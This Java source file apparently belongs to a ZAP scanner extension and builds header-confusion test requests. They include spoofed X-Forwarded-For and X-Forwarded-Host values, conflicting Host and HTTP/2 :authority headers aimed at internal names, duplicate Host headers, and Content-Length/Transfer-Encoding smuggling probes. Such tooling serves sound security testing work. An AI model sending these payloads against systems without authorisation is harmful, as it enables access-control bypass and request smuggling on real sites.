package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class HeaderConfusionTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Header Confusion"; }
    @Override public int getOrder() { return 31; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[][] hdrConfusion = {
            {"X-Forwarded-For","127.0.0.1 "},{"X-Forwarded-For"," 127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1\t"},{"X-Forwarded-For","127,0,0,1"},
            {"X-Forwarded-For","127.0.0.1,"},{"X-Forwarded-For",",127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1%00"},{"X-Forwarded-For","127.0.0.1\u0000"},
            {"X-Forwarded-For","127.0.0.1;"},{"X-Forwarded-For","127.0.0.1, 8.8.8.8"},
        };
        for (String[] pair : hdrConfusion) {
            final String hn = pair[0], hv = pair[1];
            techs.add(new Technique("Header Confusion", "HdrSpc:" + pair[1].replace("\t","\\t").replace("\0","\\0"),
                "XFF whitespace/null variant: " + pair[1],
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, hn, hv); return c; }));
        }
        techs.add(new Technique("Header Confusion", "HdrDupComma:127.0.0.1",
            "Duplicate XFF with comma-joined values",
            base -> {
                HttpMessage c = cloneMsg(base);
                c.getRequestHeader().addHeader("X-Forwarded-For", "127.0.0.1,1.2.3.4");
                return c; }));

        // Host vs HTTP/2 :authority confusion — the request line stays HTTP/1.1 while
        // a :authority pseudo-header (which many h2->h1 translating front ends prefer
        // over Host) is smuggled alongside a different Host, sometimes with the HTTP
        // version bumped to /2.0 to change which header the backend authority trusts.
        String[][] hostAuthority = {
            {"localhost", "evil.local"},
            {"127.0.0.1", "admin.internal"},
            {ctx.lastSeg.isEmpty() ? "localhost" : ctx.lastSeg, "target.local:443"},
            {"localhost:443", "127.0.0.1"},
        };
        for (String[] ha : hostAuthority) {
            final String h = ha[0], a = ha[1];
            markRawAdd(techs, new Technique("Header Confusion", "HdrHostAuth:" + h.replace("@", "AT"),
                "Host: " + h + " plus :authority: " + a + " (HTTP/1.1 request carrying h2 pseudo)",
                base -> { HttpMessage c = cloneMsg(base);
                    c.getRequestHeader().setHeader("Host", h);
                    c.getRequestHeader().setHeader(":authority", a);
                    return c; }));
            markRawAdd(techs, new Technique("Header Confusion", "HdrHostAuth2:" + h.replace("@", "AT"),
                "Host: " + h + " + :authority: " + a + ", HTTP/2.0 version line",
                base -> { HttpMessage c = cloneMsg(base);
                    c.getRequestHeader().setHeader("Host", h);
                    c.getRequestHeader().setHeader(":authority", a);
                    setHTTPVersion(c, "HTTP/2.0");
                    return c; }));
        }

        // :authority mirrors the same Host value (parser-preference probe), and
        // Host + X-Forwarded-Host conflict for URL/redirect generation confusion.
        markRawAdd(techs, new Technique("Header Confusion", "HdrAuthMirror",
            ":authority mirrors Host: both localhost",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Host", "localhost");
                c.getRequestHeader().setHeader(":authority", "localhost");
                return c; }));
        techs.add(new Technique("Header Confusion", "HdrHostXFH",
            "Host: localhost vs X-Forwarded-Host: admin.internal (URL generation)",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Host", "localhost");
                c.getRequestHeader().setHeader("X-Forwarded-Host", "admin.internal");
                return c; }));

        // Genuine duplicate Host lines (two values, one real host) and a
        // case-varied / whitespace-suffixed header name to trip lenient parsers.
        markRawAdd(techs, new Technique("Header Confusion", "HdrDupHost",
            "Two Host headers: real host then localhost",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Host", ctx.lastSeg.isEmpty() ? "target.local" : ctx.lastSeg);
                c.getRequestHeader().addHeader("Host", "localhost");
                return c; }));
        markRawAdd(techs, new Technique("Header Confusion", "HdrHostCase",
            "Header name HOST with different value (case-insensitivity probe)",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Host", "localhost");
                c.getRequestHeader().addHeader("HOST", "evil.local");
                return c; }));
        markRawAdd(techs, new Technique("Header Confusion", "HdrHostSpace",
            "Header name 'Host ' with trailing space",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Host ", "localhost");
                return c; }));

        // Content-Length hygiene: duplicate and conflicting Content-Length lines,
        // and Content-Length + Transfer-Encoding co-existence (smuggling-adjacent
        // framing confusion between front end and origin).
        markRawAdd(techs, new Technique("Header Confusion", "HdrDupCL",
            "Two Content-Length headers: 0 then 999",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Content-Length", "0");
                c.getRequestHeader().addHeader("Content-Length", "999");
                return c; }));
        markRawAdd(techs, new Technique("Header Confusion", "HdrCLTE",
            "Content-Length: 0 with Transfer-Encoding: chunked",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Content-Length", "0");
                c.getRequestHeader().addHeader("Transfer-Encoding", "chunked");
                c.getRequestHeader().setHeader("Connection", "keep-alive");
                return c; }));
        markRawAdd(techs, new Technique("Header Confusion", "HdrTEWs",
            "Transfer-Encoding: chunked with trailing space",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("Transfer-Encoding", "chunked ");
                return c; }));
        markRawAdd(techs, new Technique("Header Confusion", "HdrTECase",
            "Case-varied transfer-encoding: chunked",
            base -> { HttpMessage c = cloneMsg(base);
                c.getRequestHeader().setHeader("transfer-encoding", "chunked");
                return c; }));
    }
}
